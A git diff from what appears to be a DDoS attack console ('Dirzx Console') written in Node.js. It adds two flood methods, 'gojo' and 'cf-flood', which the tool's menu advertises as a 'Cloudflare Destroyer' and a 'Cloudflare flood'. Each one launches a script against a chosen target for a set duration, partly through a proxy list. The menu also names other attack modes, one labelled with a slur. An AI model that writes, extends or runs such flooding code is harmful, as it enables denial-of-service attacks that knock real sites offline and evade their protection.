@@ -294,6 +294,14 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
        pushOngoing(target, methods, duration)
         exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
           sigma()
+          } else if (methods === 'gojo') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma() 
+          } else if (methods === 'cf-flood') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration}`)
+          sigma()
           } else if (methods === 'slim') {
        pushOngoing(target, methods, duration)
 const destroy = path.join(__dirname, `/lib/cache/destroy`);
@@ -614,6 +622,8 @@ permen.question('[\x1b[1m\x1b[32mDirzx Console\x1b[0m]: \n', (input) => {
 || rape       || Bypass Protection
 || destroy    || Kill That Socket
 || slim       || Oh Is Fit There
+|| gojo       || Cloudflare Destroyer
+|| cf-flood   || Cloudflare flood
 [=========================================]
 `);
     sigma();
